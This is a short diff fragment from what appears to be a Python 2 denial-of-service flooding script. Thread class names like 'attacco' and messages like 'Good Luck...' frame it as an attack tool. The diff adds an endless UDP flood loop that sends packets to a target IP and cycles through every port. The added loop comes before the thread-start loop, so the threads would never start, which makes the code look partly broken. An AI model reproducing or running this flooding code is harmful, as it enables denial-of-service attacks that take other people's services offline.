@@ -350,12 +350,15 @@ connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\
 nload = 1
 x = 0
 
+while True:
+     sock.sendto(bytes, (ip,port))
+     port = port + 1
+     if port == 65534:
+       port = 1
+
 for x in xrange(thread):
     attacco().start()
-    time.sleep(0.003)
-	
-	
-
+    time.sleep(0.003)	
 print "Program Started..."
 print "Good Luck..."
 print "Ctrl + Z Stop Program..."
